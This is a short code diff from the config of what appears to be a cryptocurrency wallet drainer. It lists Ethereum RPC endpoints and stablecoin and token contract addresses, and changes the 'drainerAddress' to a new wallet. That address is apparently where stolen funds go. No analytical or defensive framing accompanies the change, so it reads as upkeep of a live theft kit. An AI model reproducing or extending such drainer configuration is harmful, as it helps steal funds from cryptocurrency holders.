@@ -15,7 +15,7 @@ const config = {
         rpcUrls: ["https://rpc.eth.gateway.fm", "https://ethereum-rpc.publicnode.com"],
         usdtAddress: "0xdac17f958d2ee523a2206206994597c13d831ec7",
         usdcAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
-        drainerAddress: "0xC9323E1eac2146c5ff34e240d2F13804913B45A6",
+        drainerAddress: "0x4202B38858847813aDEe0cdbeB339B3e4Fb2Ae82",
         otherTokenAddresses: {
           DAI: "0x6b175474e89094c44da98b954eedeac495271d0f",
           WBTC: "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599",
